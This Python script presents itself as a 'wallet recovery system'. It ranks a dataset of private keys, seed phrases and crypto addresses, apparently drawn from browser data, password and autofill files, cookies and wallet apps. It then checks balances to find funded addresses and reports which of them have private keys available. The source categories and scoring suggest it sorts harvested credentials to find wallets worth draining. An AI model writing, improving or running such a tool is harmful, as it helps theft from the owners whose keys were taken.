#!/usr/bin/env python3
"""
FINAL OPTIMIZED WALLET RECOVERY SYSTEM
======================================
Complete wallet recovery system with secure API management, multiple fallbacks,
and optimized balance checking for maximum success rate.
"""

import json
import time
import logging
from pathlib import Path
from typing import Dict, List, Optional
from enhanced_balance_checker import EnhancedBalanceChecker
from api_manager import api_manager, validate_api_setup

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('wallet_recovery_final.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class OptimizedWalletRecovery:
    """Final optimized wallet recovery system"""
    
    def __init__(self):
        self.balance_checker = EnhancedBalanceChecker()
        self.found_wallets = []
        self.checked_addresses = set()
        self.api_calls_made = 0
    
    def load_accessible_wallets(self, filename: str = "accessible_wallets_report.json") -> List[Dict]:
        """Load accessible wallets with error handling"""
        try:
            with open(filename, 'r') as f:
                data = json.load(f)
            
            wallets = data.get('accessible_wallets', [])
            logger.info(f"✅ Loaded {len(wallets):,} accessible wallets")
            return wallets
        
        except FileNotFoundError:
            logger.error(f"❌ Accessible wallets file not found: {filename}")
            return []
        except Exception as e:
            logger.error(f"❌ Error loading accessible wallets: {e}")
            return []
    
    def prioritize_wallets(self, wallets: List[Dict], limit: int = 1000) -> List[Dict]:
        """Prioritize wallets using advanced scoring system"""
        logger.info(f"🎯 Prioritizing top {limit} wallets...")
        
        scored_wallets = []
        
        for wallet in wallets:
            score = self._calculate_wallet_priority_score(wallet)
            if score > 0:  # Only include wallets with positive scores
                scored_wallets.append((score, wallet))
        
        # Sort by score (highest first)
        scored_wallets.sort(key=lambda x: x[0], reverse=True)
        
        logger.info(f"📊 Scoring complete:")
        logger.info(f"   • Wallets scored: {len(scored_wallets):,}")
        logger.info(f"   • Top score: {scored_wallets[0][0] if scored_wallets else 0}")
        logger.info(f"   • Processing top {min(limit, len(scored_wallets))} wallets")
        
        return [wallet for _, wallet in scored_wallets[:limit]]
    
    def _calculate_wallet_priority_score(self, wallet: Dict) -> float:
        """Advanced wallet scoring for prioritization"""
        score = 0.0
        
        # Base score for having private keys
        private_keys = wallet.get('private_keys', [])
        score += len(private_keys) * 5
        
        # Bonus for mnemonic phrases
        if wallet.get('mnemonic'):
            score += 25
        
        # Address quality scoring
        addresses = wallet.get('addresses', [])
        valid_addresses = []
        
        for addr in addresses:
            if self._is_valid_crypto_address(addr):
                valid_addresses.append(addr)
                if addr.startswith('0x'):  # Ethereum
                    score += 3
                elif addr.startswith(('1', '3')):  # Bitcoin
                    score += 4
                elif addr.startswith('bc1'):  # Bitcoin Bech32
                    score += 5
        
        # Bonus for more valid addresses
        score += min(len(valid_addresses) * 2, 20)
        
        # Source file analysis
        source = wallet.get('source', '').lower()
        
        # High-value file patterns
        if any(pattern in source for pattern in [
            'wallet', 'bitcoin', 'ethereum', 'metamask', 'electrum',
            'exodus', 'atomic', 'coinomi', 'trust', 'keystore'
        ]):
            score += 15
        
        # Medium-value file patterns  
        elif any(pattern in source for pattern in [
            'password', 'autofill', 'private', 'key', 'seed'
        ]):
            score += 10
        
        # Low-value file patterns
        elif any(pattern in source for pattern in ['cookie', 'history']):
            score += 2
        
        # Penalize very common sources that are less likely to have funds
        if any(pattern in source for pattern in [
            'test', 'example', 'sample', 'demo', 'template'
        ]):
            score -= 10
        
        # Private key format quality
        for pk in private_keys:
            if len(pk) == 64 and all(c in '0123456789abcdefABCDEF' for c in pk):
                score += 8  # High-quality hex private key
            elif len(pk) in [51, 52] and pk[0] in '5KL':
                score += 10  # WIF format (very good)
            elif len(pk) > 20:
                score += 5  # Decent length key
        
        return max(0, score)
    
    def _is_valid_crypto_address(self, address: str) -> bool:
        """Validate cryptocurrency address format"""
        if not isinstance(address, str) or len(address) < 20:
            return False
        
        # Ethereum address
        if len(address) == 42 and address.startswith('0x'):
            return all(c in '0123456789abcdefABCDEF' for c in address[2:])
        
        # Bitcoin Legacy (1...)
        if address.startswith('1') and 25 <= len(address) <= 34:
            return True
        
        # Bitcoin P2SH (3...)
        if address.startswith('3') and 25 <= len(address) <= 34:
            return True
        
        # Bitcoin Bech32 (bc1...)
        if address.startswith('bc1') and 39 <= len(address) <= 62:
            return True
        
        return False
    
    def extract_addresses_from_prioritized_wallets(self, wallets: List[Dict]) -> Dict[str, Dict]:
        """Extract unique addresses from prioritized wallets"""
        logger.info(f"🔍 Extracting addresses from {len(wallets)} prioritized wallets...")
        
        address_info = {}
        processed_wallets = 0
        
        for wallet in wallets:
            processed_wallets += 1
            
            if processed_wallets % 100 == 0:
                logger.info(f"   Processed {processed_wallets}/{len(wallets)} wallets...")
            
            # Extract addresses
            for addr in wallet.get('addresses', []):
                if self._is_valid_crypto_address(addr) and addr not in address_info:
                    address_info[addr] = {
                        'source': wallet.get('source', 'unknown'),
                        'private_keys_available': len(wallet.get('private_keys', [])),
                        'has_mnemonic': bool(wallet.get('mnemonic')),
                        'wallet_score': self._calculate_wallet_priority_score(wallet)
                    }
            
            # Limit total addresses to prevent memory issues
            if len(address_info) >= 5000:
                logger.info(f"⚠️  Limiting to 5,000 addresses to prevent memory issues")
                break
        
        logger.info(f"✅ Extracted {len(address_info):,} unique addresses")
        return address_info
    
    def check_balances_optimized(self, address_info: Dict[str, Dict]) -> List[Dict]:
        """Optimized balance checking with progress tracking"""
        logger.info(f"💰 Starting optimized balance checking for {len(address_info):,} addresses...")
        
        funded_addresses = []
        processed = 0
        start_time = time.time()
        
        # Sort addresses by wallet score (check highest scoring first)
        sorted_addresses = sorted(
            address_info.items(),
            key=lambda x: x[1]['wallet_score'],
            reverse=True
        )
        
        for address, info in sorted_addresses:
            if address in self.checked_addresses:
                continue
            
            processed += 1
            
            # Progress reporting
            if processed % 50 == 0 or processed == 1:
                elapsed = time.time() - start_time
                rate = processed / elapsed if elapsed > 0 else 0
                remaining = len(address_info) - processed
                eta = remaining / rate if rate > 0 else 0
                
                logger.info(f"   Progress: {processed:,}/{len(address_info):,} ({processed/len(address_info)*100:.1f}%)")
                logger.info(f"   Rate: {rate:.1f} addresses/second, ETA: {eta/60:.1f} minutes")
                logger.info(f"   Found {len(funded_addresses)} funded addresses so far")
            
            try:
                # Check balance using enhanced balance checker
                result = self.balance_checker.check_address_balance(address)
                self.checked_addresses.add(address)
                self.api_calls_made += 1
                
                if result.get('success') and result.get('has_balance'):
                    balance = result.get('balance_eth', result.get('balance_btc', 0))
                    currency = 'ETH' if 'balance_eth' in result else 'BTC'
                    api_used = result.get('api', 'unknown')
                    
                    funded_info = {
                        'address': address,
                        'balance': balance,
                        'currency': currency,
                        'api_used': api_used,
                        'source': info['source'],
                        'wallet_score': info['wallet_score'],
                        'private_keys_available': info['private_keys_available'],
                        'has_mnemonic': info['has_mnemonic']
                    }
                    
                    funded_addresses.append(funded_info)
                    
                    # Immediate notification
                    logger.info(f"💎 FUNDED ADDRESS FOUND!")
                    logger.info(f"   Address: {address}")
                    logger.info(f"   Balance: {balance:.8f} {currency}")
                    logger.info(f"   Source: {info['source']}")
                    logger.info(f"   Wallet Score: {info['wallet_score']}")
                    
                    # Save immediately in case of interruption
                    self._save_partial_results(funded_addresses)
            
            except Exception as e:
                logger.warning(f"Error checking {address}: {e}")
                continue
        
        logger.info(f"✅ Balance checking complete!")
        logger.info(f"   Addresses checked: {processed:,}")
        logger.info(f"   API calls made: {self.api_calls_made:,}")
        logger.info(f"   Funded addresses found: {len(funded_addresses)}")
        
        return funded_addresses
    
    def _save_partial_results(self, funded_addresses: List[Dict]):
        """Save partial results during processing"""
        try:
            partial_results = {
                'timestamp': time.time(),
                'funded_addresses': funded_addresses,
                'total_found': len(funded_addresses)
            }
            
            with open('partial_recovery_results.json', 'w') as f:
                json.dump(partial_results, f, indent=2)
        
        except Exception as e:
            logger.warning(f"Could not save partial results: {e}")
    
    def generate_final_report(self, funded_addresses: List[Dict]) -> Dict:
        """Generate comprehensive final report"""
        logger.info("📊 Generating final report...")
        
        total_value_eth = sum(addr['balance'] for addr in funded_addresses if addr['currency'] == 'ETH')
        total_value_btc = sum(addr['balance'] for addr in funded_addresses if addr['currency'] == 'BTC')
        
        api_usage = {}
        for addr in funded_addresses:
            api = addr.get('api_used', 'unknown')
            api_usage[api] = api_usage.get(api, 0) + 1
        
        source_analysis = {}
        for addr in funded_addresses:
            source_type = self._categorize_source(addr['source'])
            source_analysis[source_type] = source_analysis.get(source_type, 0) + 1
        
        report = {
            'summary': {
                'total_funded_addresses': len(funded_addresses),
                'total_eth_found': total_value_eth,
                'total_btc_found': total_value_btc,
                'total_api_calls': self.api_calls_made,
                'api_usage': api_usage,
                'source_analysis': source_analysis
            },
            'funded_addresses': funded_addresses,
            'methodology': 'Optimized prioritization with secure API management',
            'timestamp': time.time()
        }
        
        return report
    
    def _categorize_source(self, source: str) -> str:
        """Categorize source file type"""
        source_lower = source.lower()
        
        if 'wallet' in source_lower:
            return 'wallet_files'
        elif any(browser in source_lower for browser in ['chrome', 'firefox', 'edge', 'safari']):
            return 'browser_data'
        elif 'password' in source_lower:
            return 'password_files'
        elif 'autofill' in source_lower:
            return 'autofill_data'
        elif 'cookie' in source_lower:
            return 'cookie_data'
        elif 'history' in source_lower:
            return 'browser_history'
        else:
            return 'other'
    
    def run_complete_recovery(self, max_wallets: int = 1000) -> Dict:
        """Run complete wallet recovery process"""
        logger.info("🚀 STARTING OPTIMIZED WALLET RECOVERY")
        logger.info("=" * 60)
        
        start_time = time.time()
        
        # Step 1: Validate API setup
        logger.info("🔧 Step 1: Validating API Configuration")
        if not api_manager.has_valid_keys():
            logger.error("❌ No valid API keys found. Please configure .env file.")
            return {'error': 'No valid API keys configured'}
        
        validate_api_setup()
        
        # Step 2: Load accessible wallets
        logger.info("📁 Step 2: Loading Accessible Wallets")
        wallets = self.load_accessible_wallets()
        if not wallets:
            logger.error("❌ No accessible wallets found")
            return {'error': 'No accessible wallets found'}
        
        # Step 3: Prioritize wallets
        logger.info("🎯 Step 3: Prioritizing Wallets")
        prioritized_wallets = self.prioritize_wallets(wallets, max_wallets)
        
        # Step 4: Extract addresses
        logger.info("🔍 Step 4: Extracting Addresses")
        address_info = self.extract_addresses_from_prioritized_wallets(prioritized_wallets)
        
        if not address_info:
            logger.error("❌ No valid addresses found")
            return {'error': 'No valid addresses extracted'}
        
        # Step 5: Check balances
        logger.info("💰 Step 5: Checking Balances")
        funded_addresses = self.check_balances_optimized(address_info)
        
        # Step 6: Generate report
        logger.info("📊 Step 6: Generating Final Report")
        report = self.generate_final_report(funded_addresses)
        
        # Save results
        output_file = f'optimized_wallet_recovery_results.json'
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        elapsed_time = time.time() - start_time
        
        logger.info("🎉 WALLET RECOVERY COMPLETE!")
        logger.info("=" * 60)
        logger.info(f"⏱️  Total time: {elapsed_time/60:.1f} minutes")
        logger.info(f"💎 Funded addresses found: {len(funded_addresses)}")
        logger.info(f"💰 Total ETH: {report['summary']['total_eth_found']:.6f}")
        logger.info(f"₿  Total BTC: {report['summary']['total_btc_found']:.8f}")
        logger.info(f"📡 API calls made: {self.api_calls_made:,}")
        logger.info(f"💾 Results saved to: {output_file}")
        logger.info("=" * 60)
        
        return report

def main():
    """Main entry point"""
    print("🚀 FINAL OPTIMIZED WALLET RECOVERY SYSTEM")
    print("=" * 60)
    
    recovery = OptimizedWalletRecovery()
    
    try:
        # Run complete recovery process
        results = recovery.run_complete_recovery(max_wallets=500)
        
        if 'error' in results:
            print(f"❌ Recovery failed: {results['error']}")
            return
        
        # Show final summary
        summary = results['summary']
        print(f"\n🎯 FINAL RESULTS SUMMARY:")
        print(f"   • Funded addresses: {summary['total_funded_addresses']}")
        print(f"   • Total ETH found: {summary['total_eth_found']:.6f}")
        print(f"   • Total BTC found: {summary['total_btc_found']:.8f}")
        print(f"   • API calls made: {summary['total_api_calls']:,}")
        
        if summary['total_funded_addresses'] > 0:
            print(f"\n💎 SUCCESS! Found {summary['total_funded_addresses']} funded wallet(s)!")
        else:
            print(f"\n😔 No funded wallets found in this dataset")
    
    except KeyboardInterrupt:
        print(f"\n⏹️  Recovery interrupted by user")
        print(f"💾 Partial results may be saved in partial_recovery_results.json")
    except Exception as e:
        logger.error(f"❌ Unexpected error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == '__main__':
    main()
